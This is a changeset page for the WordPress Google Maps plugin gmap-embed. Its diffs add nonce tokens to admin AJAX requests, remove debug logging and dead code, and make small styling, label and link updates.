* [tags/1.8.4/languages/gmap-embed-de\_DE\_formal.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-de_DE_formal.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-de\_DE\_formal.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-de_DE_formal.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-es-VE.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-es-VE.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-es\_ES.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-es_ES.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-es\_ES.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-es_ES.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-es\_VE.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-es_VE.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-es\_VE.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-es_VE.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-it\_IT.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-it_IT.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-it\_IT.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-it_IT.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-nl\_NL\_formal.mo](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-nl_NL_formal.mo?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/languages/gmap-embed-nl\_NL\_formal.po](/browser/gmap-embed/tags/1.8.4/languages/gmap-embed-nl_NL_formal.po?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public](/browser/gmap-embed/tags/1.8.4/public?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public/assets](/browser/gmap-embed/tags/1.8.4/public/assets?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public/assets/css](/browser/gmap-embed/tags/1.8.4/public/assets/css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public/assets/css/front\_custom\_style.css](/browser/gmap-embed/tags/1.8.4/public/assets/css/front_custom_style.css?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public/includes](/browser/gmap-embed/tags/1.8.4/public/includes?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/public/includes/shortcodes.php](/browser/gmap-embed/tags/1.8.4/public/includes/shortcodes.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/readme.txt](/browser/gmap-embed/tags/1.8.4/readme.txt?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/srm\_gmap\_embed.php](/browser/gmap-embed/tags/1.8.4/srm_gmap_embed.php?rev=2667376 "Show entry in browser")
  (added)
* [tags/1.8.4/uninstall.php](/browser/gmap-embed/tags/1.8.4/uninstall.php?rev=2667376 "Show entry in browser")
  (added)
* [trunk/admin/assets/css/wp-gmap-style.css](/browser/gmap-embed/trunk/admin/assets/css/wp-gmap-style.css?rev=2667376 "Show entry in browser")
  (modified)
  ([1 diff](#file137 "Show differences"))
* [trunk/admin/assets/js/common.js](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2667376 "Show entry in browser")
  (modified)
  ([3 diffs](#file138 "Show differences"))
* [trunk/admin/assets/js/geo\_based\_map\_create.js](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376 "Show entry in browser")
  (modified)
  ([8 diffs](#file139 "Show differences"))
* [trunk/admin/assets/js/geo\_based\_map\_edit.js](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376 "Show entry in browser")
  (modified)
  ([6 diffs](#file140 "Show differences"))
* [trunk/admin/assets/js/setup\_wizard.js](/browser/gmap-embed/trunk/admin/assets/js/setup_wizard.js?rev=2667376 "Show entry in browser")
  (modified)
  ([1 diff](#file141 "Show differences"))
* [trunk/admin/assets/js/wgm\_map\_crud.js](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2667376 "Show entry in browser")
  (modified)
  ([3 diffs](#file142 "Show differences"))
* [trunk/admin/assets/js/wgm\_marker\_crud.js](/browser/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js?rev=2667376 "Show entry in browser")
  (modified)
  ([2 diffs](#file143 "Show differences"))
* [trunk/admin/includes/markers-icons.php](/browser/gmap-embed/trunk/admin/includes/markers-icons.php?rev=2667376 "Show entry in browser")
  (modified)
  ([2 diffs](#file144 "Show differences"))
* [trunk/admin/includes/markers-settings.php](/browser/gmap-embed/trunk/admin/includes/markers-settings.php?rev=2667376 "Show entry in browser")
  (modified)
  ([2 diffs](#file145 "Show differences"))
* [trunk/admin/includes/wgm\_messages\_viewer.php](/browser/gmap-embed/trunk/admin/includes/wgm_messages_viewer.php?rev=2667376 "Show entry in browser")
  (modified)
  ([1 diff](#file146 "Show differences"))
* [trunk/includes/traits/AssetHandler.php](/browser/gmap-embed/trunk/includes/traits/AssetHandler.php?rev=2667376 "Show entry in browser")
  (modified)
  ([1 diff](#file147 "Show differences"))
* [trunk/includes/traits/MapCRUD.php](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2667376 "Show entry in browser")
  (modified)
  ([4 diffs](#file148 "Show differences"))
* [trunk/includes/traits/MarkerCRUD.php](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376 "Show entry in browser")
  (modified)
  ([7 diffs](#file149 "Show differences"))
* [trunk/includes/traits/SetupWizard.php](/browser/gmap-embed/trunk/includes/traits/SetupWizard.php?rev=2667376 "Show entry in browser")
  (modified)
  ([1 diff](#file150 "Show differences"))
* [trunk/readme.txt](/browser/gmap-embed/trunk/readme.txt?rev=2667376 "Show entry in browser")
  (modified)
  ([2 diffs](#file151 "Show differences"))
* [trunk/srm\_gmap\_embed.php](/browser/gmap-embed/trunk/srm_gmap_embed.php?rev=2667376 "Show entry in browser")
  (modified)
  ([2 diffs](#file152 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [gmap-embed/trunk/admin/assets/css/wp-gmap-style.css](/changeset/2667376/gmap-embed/trunk/admin/assets/css/wp-gmap-style.css "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/css/wp-gmap-style.css")

  | [r2597818](/browser/gmap-embed/trunk/admin/assets/css/wp-gmap-style.css?rev=2597818#L97 "Show revision 2597818 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/css/wp-gmap-style.css?rev=2667376#L97 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 97 | 97 | } |
  | 98 | 98 |  |
  | 99 |  | .wgm\_wpgmap\_tab li:hover, .wgm\_wpgmap\_tab .active { |
  | 100 |  | background-color: white; |
  |  | 99 | .wgm\_wpgmap\_tab .active,.wgm\_wpgmap\_tab li:hover { |
  |  | 100 | background-color: #24a97f; |
  |  | 101 | color: white; |
  |  | 102 | /\*border-top: 2px solid #17c9a2;\*/ |
  | 101 | 103 | } |
  | 102 | 104 |  |
* ## [gmap-embed/trunk/admin/assets/js/common.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/common.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/common.js")

  | [r2597818](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2597818#L18 "Show revision 2597818 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2667376#L18 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 18 | 18 | var data = { |
  | 19 | 19 | 'action': 'wpgmapembed\_popup\_load\_map\_data', |
  | 20 |  | 'data': '' |
  |  | 20 | 'data': { |
  |  | 21 | c\_s\_nonce:wgm\_l.c\_s\_nonce |
  |  | 22 | } |
  | 21 | 23 | }; |
  | 22 | 24 | jQuery.post(ajaxurl, data, function (response) { |
  | […](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2597818#L71) | […](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2667376#L73) |  |
  | 71 | 73 | var data = { |
  | 72 | 74 | 'action': 'wpgmapembed\_remove\_wpgmap', |
  | 73 |  | 'post\_id': post\_id |
  |  | 75 | 'post\_id': post\_id, |
  |  | 76 | c\_s\_nonce:wgm\_l.c\_s\_nonce |
  | 74 | 77 | }; |
  | 75 | 78 |  |
  | […](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2597818#L150) | […](/browser/gmap-embed/trunk/admin/assets/js/common.js?rev=2667376#L153) |  |
  | 150 | 153 | var data = { |
  | 151 | 154 | 'action': 'wpgmapembed\_save\_map\_data', |
  | 152 |  | 'map\_data': map\_data |
  |  | 155 | 'map\_data': map\_data, |
  |  | 156 | c\_s\_nonce:wgm\_l.c\_s\_nonce |
  | 153 | 157 | }; |
  | 154 | 158 |  |
* ## [gmap-embed/trunk/admin/assets/js/geo\_based\_map\_create.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/geo_based_map_create.js")

  | [r2654634](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L77 "Show revision 2654634 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L77 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 77 | 77 | } |
  | 78 | 78 |  |
  | 79 |  | ~~console.log('yes, here');~~ |
  | 80 | 79 | } |
  | 81 | 80 |  |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L169) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L168) |  |
  | 169 | 168 | \*/ |
  | 170 | 169 | function wgm\_addMarkerDragendListener(marker) { |
  | 171 |  | ~~console.log(marker);~~ |
  | 172 | 170 | marker.addListener('dragend', function (markerLocation) { |
  | 173 | 171 | \_wgm\_e("wpgmap\_marker\_lat\_lng").value = markerLocation.latLng.lat() + "," + markerLocation.latLng.lng(); |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L188) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L186) |  |
  | 188 | 186 | // For each place, get the icon, name and location. |
  | 189 | 187 | var bounds = new google.maps.LatLngBounds(); |
  | 190 |  | ~~console.log(bounds);~~ |
  | 191 | 188 | places.forEach(function (place) { |
  | 192 | 189 | if (!place.geometry) { |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L469) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L466) |  |
  | 469 | 466 | // }; |
  | 470 | 467 |  |
  | 471 |  | /\*\* |
  | 472 |  | \* Disabled from 1.7.8 due to user request |
  | 473 |  | \* Browser geo location failed |
  | 474 |  | \* @param error |
  | 475 |  | \* @since 1.0.0 |
  | 476 |  | \*/ |
  | 477 |  | // var wgm\_browserGeolocationFail = function (error) { |
  | 478 |  | //     switch (error.code) { |
  | 479 |  | //         case error.TIMEOUT://3 |
  | 480 |  | //             console.log("Browser geolocation error !\n\nTimeout."); |
  | 481 |  | //             wgm\_initWpGmap(40.73359922990751, -74.02791395625002, 'ROADMAP'); |
  | 482 |  | //             wgm\_center\_lat = 40.73359922990751; |
  | 483 |  | //             wgm\_center\_lng = -74.02791395625002; |
  | 484 |  | //             break; |
  | 485 |  | //         case error.PERMISSION\_DENIED://1 |
  | 486 |  | //             console.log('API geo location error, permission denied!!'); |
  | 487 |  | //             wgm\_tryAPIGeolocation(); |
  | 488 |  | //             break; |
  | 489 |  | //         case error.POSITION\_UNAVAILABLE://2 |
  | 490 |  | //             console.log("Browser geolocation error !\n\nPosition unavailable."); |
  | 491 |  | //             wgm\_initWpGmap(40.73359922990751, -74.02791395625002, 'ROADMAP'); |
  | 492 |  | //             wgm\_center\_lat = 40.73359922990751; |
  | 493 |  | //             wgm\_center\_lng = -74.02791395625002; |
  | 494 |  | //             break; |
  | 495 |  | // |
  | 496 |  | //     } |
  | 497 |  | // }; |
  |  | 468 |  |
  | 498 | 469 |  |
  | 499 | 470 | /\*\* |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L606) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L577) |  |
  | 606 | 577 | custom\_uploader.on('select', function () { |
  | 607 | 578 | var attachment = custom\_uploader.state().get('selection').first().toJSON(); |
  | 608 |  | ~~console.log(attachment);~~ |
  | 609 | 579 |  |
  | 610 | 580 | var data = { |
  | 611 | 581 | 'action': 'wpgmapembed\_save\_marker\_icon', |
  | 612 | 582 | 'data': { |
  | 613 |  | icon\_url: attachment.url |
  |  | 583 | icon\_url: attachment.url, |
  |  | 584 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 614 | 585 | } |
  | 615 | 586 | }; |
  | 616 | 587 | jQuery.post(ajaxurl, data, function (response) { |
  | 617 |  | ~~console.log(1000);~~ |
  | 618 | 588 | response = JSON.parse(response); |
  | 619 | 589 | $(document.body).find("#wpgmap\_marker\_icon").val(response.icon\_url); |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L779) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L749) |  |
  | 779 | 749 | 'action': 'wpgmapembed\_delete\_marker', |
  | 780 | 750 | 'data': { |
  | 781 |  | marker\_id: marker\_id |
  |  | 751 | marker\_id: marker\_id, |
  |  | 752 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 782 | 753 | } |
  | 783 | 754 | }; |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L786) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L757) |  |
  | 786 | 757 | generateMarkersListView(); |
  | 787 | 758 | parent.find('.spinner').css('visibility', 'hidden'); |
  | 788 |  | ~~console.log(parseInt(marker\_id));~~ |
  | 789 | 759 | current\_map\_markers[parseInt(marker\_id)].setMap(null); |
  | 790 | 760 | current\_map\_markers.splice(parseInt(marker\_id), 1); |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2654634#L825) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_create.js?rev=2667376#L795) |  |
  | 825 | 795 | 'action': 'wpgmapembed\_get\_marker\_data\_by\_marker\_id', |
  | 826 | 796 | 'data': { |
  | 827 |  | marker\_id: marker\_id |
  |  | 797 | marker\_id: marker\_id, |
  |  | 798 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 828 | 799 | } |
  | 829 | 800 | }; |
* ## [gmap-embed/trunk/admin/assets/js/geo\_based\_map\_edit.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js")

  | [r2654634](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L32 "Show revision 2654634 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L32 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 32 | 32 | } |
  | 33 | 33 |  |
  | 34 |  | ~~/\*\*~~ |
  | 35 |  | ~~\* Disabled from 1.7.8 - due to the field eliminated~~ |
  | 36 |  | ~~\* Getting detailed address by lat,lng~~ |
  | 37 |  | ~~\* @param lat~~ |
  | 38 |  | ~~\* @param lng~~ |
  | 39 |  | ~~\* @since 1.5.0~~ |
  | 40 |  | ~~\*/~~ |
  | 41 |  | ~~// function wgm\_SetAddressByLatLng(lat, lng) {~~ |
  | 42 |  | ~~//     jQuery.getJSON('https://maps.googleapis.com/maps/api/geocode/json?key=' + wgp\_api\_key + '&latlng=' + lat + ',' + lng + '&sensor=true')~~ |
  | 43 |  | ~~//         .done(function (location) {~~ |
  | 44 |  | ~~//             if (location.status === 'OK') {~~ |
  | 45 |  | ~~//                 \_wgm\_e('wpgmap\_map\_address').value = location.results[0].formatted\_address;~~ |
  | 46 |  | ~~//             }~~ |
  | 47 |  | ~~//         })~~ |
  | 48 |  | ~~//         .fail(function (d) {~~ |
  | 49 |  | ~~//             console.log(d);~~ |
  | 50 |  | ~~//         })~~ |
  | 51 |  | ~~//         .always(function (d) {~~ |
  | 52 |  | ~~//             console.log(d);~~ |
  | 53 |  | ~~//         });~~ |
  | 54 |  | ~~//~~ |
  | 55 |  | ~~// }~~ |
  | 56 | 34 |  |
  | 57 | 35 | // This function allows the script to run from both locations (visual and text) |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L262) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L240) |  |
  | 262 | 240 | } |
  | 263 | 241 | if (response.markers.length > 0) { |
  | 264 |  | ~~console.log(response.markers);~~ |
  | 265 | 242 | response.markers.forEach(function (marker) { |
  | 266 | 243 | var marker\_lat\_lng = marker.lat\_lng.split(','); |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L474) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L451) |  |
  | 474 | 451 | custom\_uploader.on('select', function () { |
  | 475 | 452 | var attachment = custom\_uploader.state().get('selection').first().toJSON(); |
  | 476 |  | ~~console.log(attachment);~~ |
  | 477 | 453 |  |
  | 478 | 454 | var data = { |
  | 479 | 455 | 'action': 'wpgmapembed\_save\_marker\_icon', |
  | 480 | 456 | 'data': { |
  | 481 |  | icon\_url: attachment.url |
  |  | 457 | icon\_url: attachment.url, |
  |  | 458 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 482 | 459 | } |
  | 483 | 460 | }; |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L648) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L625) |  |
  | 648 | 625 | 'action': 'wpgmapembed\_delete\_marker', |
  | 649 | 626 | 'data': { |
  | 650 |  | marker\_id: marker\_id |
  |  | 627 | marker\_id: marker\_id, |
  |  | 628 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 651 | 629 | } |
  | 652 | 630 | }; |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L655) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L633) |  |
  | 655 | 633 | generateMarkersListView(); |
  | 656 | 634 | parent.find('.spinner').css('visibility', 'hidden'); |
  | 657 |  | ~~console.log(parseInt(marker\_id));~~ |
  | 658 | 635 | current\_map\_markers[parseInt(marker\_id)].setMap(null); |
  | 659 | 636 | $(document.body).find('#marker\_success').html('Marker removed successfully.'); |
  | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2654634#L690) | […](/browser/gmap-embed/trunk/admin/assets/js/geo_based_map_edit.js?rev=2667376#L667) |  |
  | 690 | 667 | 'action': 'wpgmapembed\_get\_marker\_data\_by\_marker\_id', |
  | 691 | 668 | 'data': { |
  | 692 |  | marker\_id: marker\_id |
  |  | 669 | marker\_id: marker\_id, |
  |  | 670 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 693 | 671 | } |
  | 694 | 672 | }; |
* ## [gmap-embed/trunk/admin/assets/js/setup\_wizard.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/setup_wizard.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/setup_wizard.js")

  | [r2597818](/browser/gmap-embed/trunk/admin/assets/js/setup_wizard.js?rev=2597818#L108 "Show revision 2597818 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/setup_wizard.js?rev=2667376#L108 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 108 | 108 | 'wgm\_api\_key': wgm\_api\_key, |
  | 109 | 109 | 'wgm\_language': wgm\_language, |
  | 110 |  | 'wgm\_regional\_area': wgm\_regional\_area |
  |  | 110 | 'wgm\_regional\_area': wgm\_regional\_area, |
  |  | 111 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 111 | 112 | }; |
  | 112 | 113 | $.post(ajaxurl, data, function (response) { |
* ## [gmap-embed/trunk/admin/assets/js/wgm\_map\_crud.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/wgm_map_crud.js")

  | [r2597818](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2597818#L7 "Show revision 2597818 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2667376#L7 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 7 | 7 | var wgm\_map\_list = $('#wgm\_map\_list\_dt').DataTable({ |
  | 8 | 8 | ajax: { |
  | 9 |  | url: ajaxurl + '?action=wgm\_get\_all\_maps~~'~~ |
  |  | 9 | url: ajaxurl + '?action=wgm\_get\_all\_maps&ajax\_nonce='+wgm\_l.ajax\_nonce |
  | 10 | 10 | }, |
  | 11 | 11 | columns: [ |
  | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2597818#L25) | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2667376#L25) |  |
  | 25 | 25 |  |
  | 26 | 26 | /\*\* |
  | 27 |  | \* Datatable to view ma~~p~~ list |
  |  | 27 | \* Datatable to view marker list |
  | 28 | 28 | \* @since 1.7.5 |
  | 29 | 29 | \*/ |
  | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2597818#L31) | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_map_crud.js?rev=2667376#L31) |  |
  | 31 | 31 | var wgm\_gmap\_marker\_list = $('#wgm\_gmap\_marker\_list').DataTable({ |
  | 32 | 32 | ajax: { |
  | 33 |  | url: ajaxurl + '?action=wgm\_get\_markers\_by\_map\_id&map\_id=' + wgm\_map\_id |
  |  | 33 | url: ajaxurl + '?action=wgm\_get\_markers\_by\_map\_id&map\_id=' + wgm\_map\_id+'&ajax\_nonce='+wgm\_l.ajax\_nonce |
  | 34 | 34 | }, |
  | 35 | 35 | columns: [ |
* ## [gmap-embed/trunk/admin/assets/js/wgm\_marker\_crud.js](/changeset/2667376/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js")

  | [r2654634](/browser/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js?rev=2654634#L7 "Show revision 2654634 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js?rev=2667376#L7 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 7 | 7 | /\*\* |
  | 8 | 8 | \* Vanish a marker from Map view |
  | 9 |  | ~~\* @param marker~~ |
  | 10 | 9 | \* @param type string |
  | 11 | 10 | \*/ |
  | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js?rev=2654634#L107) | […](/browser/gmap-embed/trunk/admin/assets/js/wgm_marker_crud.js?rev=2667376#L106) |  |
  | 107 | 106 | var data = { |
  | 108 | 107 | 'action': action, |
  | 109 |  | 'map\_markers\_data': map\_markers\_data |
  |  | 108 | 'map\_markers\_data': map\_markers\_data, |
  |  | 109 | ajax\_nonce:wgm\_l.ajax\_nonce |
  | 110 | 110 | }; |
  | 111 | 111 |  |
* ## [gmap-embed/trunk/admin/includes/markers-icons.php](/changeset/2667376/gmap-embed/trunk/admin/includes/markers-icons.php "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/includes/markers-icons.php")

  | [r2644061](/browser/gmap-embed/trunk/admin/includes/markers-icons.php?rev=2644061#L1 "Show revision 2644061 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/includes/markers-icons.php?rev=2667376#L1 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <ul class="wgm\_gmap\_embed\_marker\_icons"> |
  | 2 |  | <?php |
  | 3 |  | global $wpdb; |
  | 4 |  | ~~$wpgmap\_marker\_icons = $wpdb->get\_results( $wpdb->prepare("SELECT type, file\_name FROM {$wpdb->prefix}wgm\_icons"), OBJECT~~ ); |
  | 5 |  | ~~foreach ( $wpgmap\_marker\_icons as $key => $marker\_icon~~ ) { |
  |  | 2 | <?php |
  |  | 3 | global $wpdb; |
  |  | 4 | $wpgmap\_marker\_icons = $wpdb->get\_results("SELECT type, file\_name FROM {$wpdb->prefix}wgm\_icons", OBJECT); |
  |  | 5 | foreach ($wpgmap\_marker\_icons as $key => $marker\_icon) { |
  | 6 | 6 |  |
  | 7 | 7 | //      $map\_icon\_data = array( |
  | […](/browser/gmap-embed/trunk/admin/includes/markers-icons.php?rev=2644061#L24) | […](/browser/gmap-embed/trunk/admin/includes/markers-icons.php?rev=2667376#L24) |  |
  | 24 | 24 | //      ); |
  | 25 | 25 |  |
  | 26 |  | $image\_path = $marker\_icon->file\_name; |
  | 27 |  | ~~if ( $marker\_icon->type == 'pre\_uploaded\_icon'~~ ) { |
  | 28 |  | ~~$image\_path = plugin\_dir\_url( \_\_FILE\_\_ ) . "../assets/images/markers/" . basename( $marker\_icon->file\_name~~ ); |
  | 29 |  | } |
  | 30 |  | ?> |
  |  | 26 | $image\_path = $marker\_icon->file\_name; |
  |  | 27 | if ($marker\_icon->type == 'pre\_uploaded\_icon') { |
  |  | 28 | $image\_path = plugin\_dir\_url(\_\_FILE\_\_) . "../assets/images/markers/" . basename($marker\_icon->file\_name); |
  |  | 29 | } |
  |  | 30 | ?> |
  | 31 | 31 | <li> |
  | 32 | 32 | <img width="32" src="<?php echo $image\_path; ?>" onclick="wpgmapChangeCurrentMarkerIcon(this);"/> |
  | 33 | 33 | </li> |
  | 34 |  | <?php |
  | 35 |  | } |
  | 36 |  | ?> |
  |  | 34 | <?php |
  |  | 35 | } |
  |  | 36 | ?> |
  | 37 | 37 | </ul> |
* ## [gmap-embed/trunk/admin/includes/markers-settings.php](/changeset/2667376/gmap-embed/trunk/admin/includes/markers-settings.php "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/includes/markers-settings.php")

  | [r2654634](/browser/gmap-embed/trunk/admin/includes/markers-settings.php?rev=2654634#L77 "Show revision 2654634 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/includes/markers-settings.php?rev=2667376#L77 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 77 | 77 | array( |
  | 78 | 78 | 'action' => 'wpgmapembed\_get\_marker\_icons', |
  | 79 |  | 'from' => 'create' |
  |  | 79 | 'from' => 'create', |
  |  | 80 | 'ajax\_nonce'=>wp\_create\_nonce('ajax\_nonce') |
  | 80 | 81 | ), |
  | 81 | 82 | admin\_url('admin-ajax.php') |
  | […](/browser/gmap-embed/trunk/admin/includes/markers-settings.php?rev=2654634#L144) | […](/browser/gmap-embed/trunk/admin/includes/markers-settings.php?rev=2667376#L145) |  |
  | 144 | 145 |  |
  | 145 | 146 | <label> |
  | 146 |  | <span class="alignleft"><?php \_e('Open marker ~~Info Window~~ by default', 'gmap-embed'); ?></span>&nbsp; |
  |  | 147 | <span class="alignleft"><?php \_e('Open marker description by default', 'gmap-embed'); ?></span>&nbsp; |
  | 147 | 148 | <select name="wpgmap\_marker\_infowindow\_show" id="wpgmap\_marker\_infowindow\_show"> |
  | 148 | 149 | <option value="1">Yes</option> |
* ## [gmap-embed/trunk/admin/includes/wgm\_messages\_viewer.php](/changeset/2667376/gmap-embed/trunk/admin/includes/wgm_messages_viewer.php "Show the changeset 2667376 restricted to gmap-embed/trunk/admin/includes/wgm_messages_viewer.php")

  | [r2644061](/browser/gmap-embed/trunk/admin/includes/wgm_messages_viewer.php?rev=2644061#L10 "Show revision 2644061 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/admin/includes/wgm_messages_viewer.php?rev=2667376#L10 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 10 | 10 | switch ($message\_status) { |
  | 11 | 11 | case 1: |
  | 12 |  | echo \_\_( 'Map has been created Successfully. <a href="' . esc\_url( 'https://youtu.be/~~o90H34eacHg?t=231~~' ) . '" target="\_blank"> See How to use >></a>', 'gmap-embed' ); |
  |  | 12 | echo \_\_( 'Map has been created Successfully. <a href="' . esc\_url( 'https://youtu.be/9KZOUJ9Gdv8?t=255' ) . '" target="\_blank"> See How to use >></a>', 'gmap-embed' ); |
  | 13 | 13 | break; |
  | 14 | 14 | case 3: |
* ## [gmap-embed/trunk/includes/traits/AssetHandler.php](/changeset/2667376/gmap-embed/trunk/includes/traits/AssetHandler.php "Show the changeset 2667376 restricted to gmap-embed/trunk/includes/traits/AssetHandler.php")

  | [r2644061](/browser/gmap-embed/trunk/includes/traits/AssetHandler.php?rev=2644061#L66 "Show revision 2644061 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/includes/traits/AssetHandler.php?rev=2667376#L66 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 66 | 66 | 'locales' => $locales, |
